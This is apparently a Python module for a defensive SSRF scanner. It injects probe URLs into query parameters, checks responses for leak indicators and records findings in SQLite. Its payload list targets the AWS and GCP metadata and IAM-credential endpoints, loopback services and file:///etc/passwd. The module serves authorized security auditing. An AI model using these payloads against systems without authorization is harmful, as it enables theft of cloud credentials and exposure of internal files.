"""Server-Side Request Forgery (SSRF) and web vulnerability scanner.

Given a target URL that carries query parameters, this scanner substitutes a
curated list of SSRF probe payloads into each parameter, sends the crafted
request to the target, and inspects the response for indicators that the
server fetched an attacker-controlled resource (cloud instance metadata,
internal service banners, or local file contents).

Safety and scope notes:

* Only HTTP(S) requests to the *target* are ever issued. The probe payloads
  (``file://``, ``http://169.254.169.254/...``) travel as parameter *values*
  so that the target server is the one asked to dereference them; the scanner
  never dereferences them itself. :func:`_fetch` refuses any non-HTTP(S)
  request URL as a defensive guard against accidental local file reads or
  metadata access from the scanning host.
* This module is intended for authorized auditing of systems you own or have
  permission to test.

Per the project coding standards the scanner depends on the storage layer but
never on the reporting engine.
"""

from __future__ import annotations

import sqlite3
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

PROJECT_ROOT: Path = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from database.setup import DB_PATH, initialize_database  # noqa: E402

#: Severity recorded for every confirmed SSRF finding.
SSRF_SEVERITY: str = "HIGH"

#: Seconds to wait for the target to respond before abandoning a probe.
REQUEST_TIMEOUT: int = 8

#: Cap on response bytes read; SSRF indicators appear early and unbounded
#: reads let a hostile target exhaust memory.
MAX_RESPONSE_BYTES: int = 256 * 1024

#: User-Agent presented to the target. Honest identification, not evasion.
USER_AGENT: str = "AntiFine-SSRF-Scanner/1.0 (defensive-audit)"

#: Request URL schemes the scanner is permitted to dereference.
_ALLOWED_SCHEMES: frozenset[str] = frozenset({"http", "https"})


class SSRFScannerError(RuntimeError):
    """Raised when the SSRF scan cannot be carried out or persisted."""


@dataclass(frozen=True)
class Payload:
    """A single SSRF probe and the response strings that confirm a hit.

    Attributes:
        name: Short identifier for the probe class.
        value: The payload placed into a target parameter's value.
        category: Human-readable vulnerability class for reporting.
        indicators: Case-insensitive substrings whose presence in a response
            body strongly implies the payload was dereferenced by the target.
    """

    name: str
    value: str
    category: str
    indicators: tuple[str, ...]


@dataclass(frozen=True)
class SSRFFinding:
    """A confirmed SSRF indicator for one parameter/payload combination."""

    parameter: str
    payload: Payload
    matched_indicator: str
    test_url: str
    status_code: int | None = None

    @property
    def severity(self) -> str:
        """Severity stored in ``scan_results`` (always HIGH for SSRF)."""
        return SSRF_SEVERITY

    @property
    def vulnerability_type(self) -> str:
        """Descriptive finding label persisted to the database."""
        return (
            f"SSRF: {self.payload.category} via '{self.parameter}' parameter "
            f"(payload={self.payload.value!r}, indicator={self.matched_indicator!r})"
        )


#: Curated probe set covering the most impactful SSRF outcomes: cloud
#: metadata credential theft, internal-service reach, and local file read.
DEFAULT_PAYLOADS: tuple[Payload, ...] = (
    Payload(
        name="aws-metadata-root",
        value="http://169.254.169.254/latest/meta-data/",
        category="AWS instance metadata exposure",
        indicators=(
            "ami-id",
            "instance-id",
            "instance-type",
            "local-hostname",
            "public-keys",
            "reservation-id",
            "security-credentials",
            "iam/",
        ),
    ),
    Payload(
        name="aws-iam-credentials",
        value="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        category="AWS IAM credential exposure",
        indicators=(
            "AccessKeyId",
            "SecretAccessKey",
            "\"Token\"",
            "Expiration",
        ),
    ),
    Payload(
        name="gcp-metadata",
        value="http://metadata.google.internal/computeMetadata/v1/",
        category="GCP instance metadata exposure",
        indicators=(
            "computeMetadata",
            "project-id",
            "service-accounts",
            "numeric-project-id",
        ),
    ),
    Payload(
        name="loopback-http",
        value="http://127.0.0.1/",
        category="Internal service exposure (loopback)",
        indicators=(
            "Welcome to nginx",
            "It works!",
            "Apache/",
            "nginx/",
            "phpMyAdmin",
            "<title>Dashboard",
        ),
    ),
    Payload(
        name="file-etc-passwd",
        value="file:///etc/passwd",
        category="Local file disclosure",
        indicators=(
            "root:x:0:0:",
            ":/root:",
            ":/bin/bash",
            "daemon:",
            "/usr/sbin/nologin",
        ),
    ),
)


@dataclass(frozen=True)
class HttpResponse:
    """Minimal response abstraction so the network layer is easy to mock."""

    status: int
    body: str
    url: str = ""
    headers: dict[str, str] = field(default_factory=dict)


def build_test_urls(
    target_url: str,
    payloads: tuple[Payload, ...] = DEFAULT_PAYLOADS,
) -> list[tuple[str, Payload, str]]:
    """Enumerate crafted request URLs for every parameter/payload pair.

    For each query parameter in ``target_url`` and each payload, a variant URL
    is produced in which that single parameter's value is replaced by the
    payload while all other parameters are preserved.

    Args:
        target_url: Target URL including a query string, e.g.
            ``http://host/api?url=test&id=5``.
        payloads: Probe payloads to inject.

    Returns:
        Tuples of ``(parameter_name, payload, crafted_url)``. Empty if the
        target carries no query parameters (nothing to inject into).

    Raises:
        SSRFScannerError: If ``target_url`` is not a valid HTTP(S) URL.
    """
    parsed = urlparse(target_url)
    if parsed.scheme.lower() not in _ALLOWED_SCHEMES:
        raise SSRFScannerError(
            f"Target URL must be http(s); got scheme {parsed.scheme!r}"
        )
    if not parsed.netloc:
        raise SSRFScannerError(f"Target URL is missing a host: {target_url!r}")

    params = parse_qsl(parsed.query, keep_blank_values=True)
    crafted: list[tuple[str, Payload, str]] = []

    for index, (name, _original_value) in enumerate(params):
        for payload in payloads:
            mutated = list(params)
            mutated[index] = (name, payload.value)
            new_query = urlencode(mutated)
            new_url = urlunparse(parsed._replace(query=new_query))
            crafted.append((name, payload, new_url))

    return crafted


def _fetch(url: str, timeout: int = REQUEST_TIMEOUT) -> HttpResponse | None:
    """Send a single GET request to ``url`` and return the response.

    Only HTTP(S) request URLs are permitted; any other scheme raises, guarding
    against the scanning host itself dereferencing ``file://`` or metadata
    endpoints. Network failures are swallowed (returning ``None``) so one dead
    probe cannot abort a scan.

    Args:
        url: The crafted request URL (points at the target host).
        timeout: Per-request timeout in seconds.

    Returns:
        The response, or ``None`` if the request failed or timed out.

    Raises:
        SSRFScannerError: If ``url`` is not an HTTP(S) URL.
    """
    scheme = urlparse(url).scheme.lower()
    if scheme not in _ALLOWED_SCHEMES:
        raise SSRFScannerError(
            f"Refusing to issue a non-HTTP(S) request to {url!r}"
        )

    request = urllib.request.Request(
        url, headers={"User-Agent": USER_AGENT}, method="GET"
    )

    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:  # noqa: S310
            raw = response.read(MAX_RESPONSE_BYTES)
            body = raw.decode("utf-8", errors="replace")
            headers = {k: v for k, v in response.headers.items()}
            return HttpResponse(
                status=getattr(response, "status", 0) or 0,
                body=body,
                url=response.geturl(),
                headers=headers,
            )
    except urllib.error.HTTPError as exc:
        # An error status still carries a body worth analysing (e.g. a 500 that
        # leaked file contents), so surface it rather than discarding it.
        try:
            raw = exc.read(MAX_RESPONSE_BYTES)
            body = raw.decode("utf-8", errors="replace")
        except (OSError, ValueError):
            body = ""
        return HttpResponse(status=exc.code, body=body, url=url)
    except (urllib.error.URLError, TimeoutError, OSError, ValueError):
        # DNS failure, connection refused, timeout, malformed URL: skip probe.
        return None


def analyze_response(body: str, payload: Payload) -> str | None:
    """Return the first success indicator found in ``body``, else ``None``.

    Matching is case-insensitive so that header/JSON casing differences do not
    hide a genuine leak.

    Args:
        body: Response body text.
        payload: The payload whose indicators to search for.

    Returns:
        The matched indicator string (original casing), or ``None``.
    """
    if not body:
        return None
    haystack = body.lower()
    for indicator in payload.indicators:
        if indicator.lower() in haystack:
            return indicator
    return None


def scan_target(
    target_url: str,
    payloads: tuple[Payload, ...] = DEFAULT_PAYLOADS,
    timeout: int = REQUEST_TIMEOUT,
    fetcher=_fetch,
) -> list[SSRFFinding]:
    """Probe every parameter of ``target_url`` and collect SSRF findings.

    Args:
        target_url: Target URL with query parameters to fuzz.
        payloads: Probe payloads to inject.
        timeout: Per-request timeout in seconds.
        fetcher: Callable ``(url, timeout) -> HttpResponse | None`` used to
            issue requests. Injectable so tests can supply mocked responses
            without any real network traffic.

    Returns:
        Confirmed findings, one per parameter/payload combination that matched
        an indicator.

    Raises:
        SSRFScannerError: If ``target_url`` is invalid.
    """
    tests = build_test_urls(target_url, payloads)
    findings: list[SSRFFinding] = []

    for parameter, payload, test_url in tests:
        response = fetcher(test_url, timeout)
        if response is None:
            continue
        matched = analyze_response(response.body, payload)
        if matched is None:
            continue
        findings.append(
            SSRFFinding(
                parameter=parameter,
                payload=payload,
                matched_indicator=matched,
                test_url=test_url,
                status_code=response.status,
            )
        )

    return findings


def record_findings(
    findings: list[SSRFFinding],
    db_path: Path = DB_PATH,
    target_id: int = 1,
    status: str = "OPEN",
) -> int:
    """Persist SSRF findings to the ``scan_results`` table at HIGH severity.

    Args:
        findings: Findings to store.
        db_path: SQLite database file.
        target_id: Audit target the findings belong to.
        status: Lifecycle status recorded against each row.

    Returns:
        Number of rows inserted.

    Raises:
        SSRFScannerError: If the database cannot be written.
    """
    if not findings:
        return 0

    rows = [
        (target_id, finding.vulnerability_type, finding.severity, status)
        for finding in findings
    ]

    try:
        initialize_database(db_path)
        with sqlite3.connect(db_path) as connection:
            connection.executemany(
                "INSERT INTO scan_results "
                "(target_id, vulnerability_type, severity, status) "
                "VALUES (?, ?, ?, ?)",
                rows,
            )
            connection.commit()
    except (sqlite3.Error, OSError) as exc:
        raise SSRFScannerError(
            f"Could not write findings to {db_path}: {exc}"
        ) from exc

    return len(rows)


def run_web_audit(
    target_url: str,
    db_path: Path = DB_PATH,
    target_id: int = 1,
    payloads: tuple[Payload, ...] = DEFAULT_PAYLOADS,
    timeout: int = REQUEST_TIMEOUT,
    persist: bool = True,
    fetcher=_fetch,
) -> list[SSRFFinding]:
    """Run the full web audit: probe the target and optionally persist hits.

    Args:
        target_url: Target URL with query parameters to fuzz.
        db_path: SQLite database file.
        target_id: Audit target the findings belong to.
        payloads: Probe payloads to inject.
        timeout: Per-request timeout in seconds.
        persist: When False, skip the database write (dry run).
        fetcher: Request callable; injectable for testing.

    Returns:
        The findings identified.

    Raises:
        SSRFScannerError: If the target is invalid or persistence fails.
    """
    findings = scan_target(
        target_url, payloads=payloads, timeout=timeout, fetcher=fetcher
    )
    if persist:
        record_findings(findings, db_path=db_path, target_id=target_id)
    return findings


def format_summary(target_url: str, findings: list[SSRFFinding]) -> str:
    """Build a plain-text summary of an SSRF scan run."""
    lines = [f"SSRF/web audit of {target_url}:"]
    if not findings:
        lines.append("No SSRF indicators detected.")
        return "\n".join(lines)

    lines.append(f"{len(findings)} SSRF indicator(s) flagged:")
    for finding in findings:
        lines.append(
            f"  [{finding.severity:<4}] {finding.payload.category} "
            f"via '{finding.parameter}' "
            f"(matched {finding.matched_indicator!r}, "
            f"HTTP {finding.status_code})"
        )
    return "\n".join(lines)
